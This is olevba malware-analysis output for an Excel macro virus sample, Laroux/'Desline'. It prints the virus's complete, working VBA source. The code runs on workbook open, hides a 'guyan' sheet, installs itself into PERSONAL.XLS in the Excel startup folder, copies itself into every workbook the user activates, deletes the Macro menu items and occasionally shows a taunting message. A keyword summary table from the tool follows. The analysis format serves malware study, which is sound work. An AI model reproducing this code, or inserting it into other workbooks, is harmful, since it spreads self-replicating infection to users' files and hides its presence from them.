olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.fa-11cd5d1a1a6183fd6ce0ef43a2eb980983f0b5c9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO guyan.bas 
in file: Virus.MSExcel.Laroux.fa-11cd5d1a1a6183fd6ce0ef43a2eb980983f0b5c9 - OLE stream: '_VBA_PROJECT_CUR/VBA/guyan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = "al_muskilat"
End Sub


Sub al_muskilat()
Attribute al_muskilat.VB_ProcData.VB_Invoke_Func = " \n14"
' *****************************************************************
' Name    : ExcelMacro.al_muskilat
' Origin  : England
' Created : January 01, 1997
' Author  : Pyro [VBB]
' *****************************************************************
On Error GoTo ErrorHandler
Application.ScreenUpdating = False
Application.DisplayAlerts = False
Installed = 0
If ThisWorkbook.Name <> "PERSONAL.XLS" Then
If Dir(Application.StartupPath + "\PERSONAL.XLS") = "PERSONAL.XLS" Then Installed = 1
If Installed = 1 Then
GoTo ErrorHandler
Else
Workbooks.Add.SaveAs FileName:=Application.StartupPath + "\PERSONAL.XLS"
Workbooks(ThisWorkbook.Name).Sheets("guyan").Copy Before:=Workbooks("PERSONAL.XLS").Sheets(1)
Workbooks("PERSONAL.XLS").Sheets("guyan").Visible = False
Workbooks("PERSONAL.XLS").Save
Windows("PERSONAL.XLS").Visible = False
End If
Else
Windows("PERSONAL.XLS").Visible = False
For I = 1 To Workbooks(ActiveWorkbook.Name).Sheets.Count
If Workbooks(ActiveWorkbook.Name).Sheets(I).Name = "guyan" Then Installed = 1
Next
If Installed = 1 Then
GoTo ErrorHandler
Else
Workbooks("PERSONAL.XLS").Sheets("guyan").Copy Before:=Workbooks(ActiveWorkbook.Name).Sheets(1)
Workbooks(ActiveWorkbook.Name).Sheets("guyan").Visible = False
Workbooks(ActiveWorkbook.Name).Save
Windows("PERSONAL.XLS").Visible = False
End If
End If
Workbooks("PERSONAL.XLS").Save
Application.ScreenUpdating = True
Application.DisplayAlerts = True
If Day(Now()) = Int((31 * Rnd) + 1) Then MsgBox "You've Been Infected By Desline!", 16, "boo hoo hoo....Ha... [VBB]"
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlModule).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlNoDocuments).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlInfo).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
ErrorHandler:
On Error Resume Next
Err = 0
Workbooks(ActiveWorkbook.Name).Sheets("guyan").Visible = False
On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  guya
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

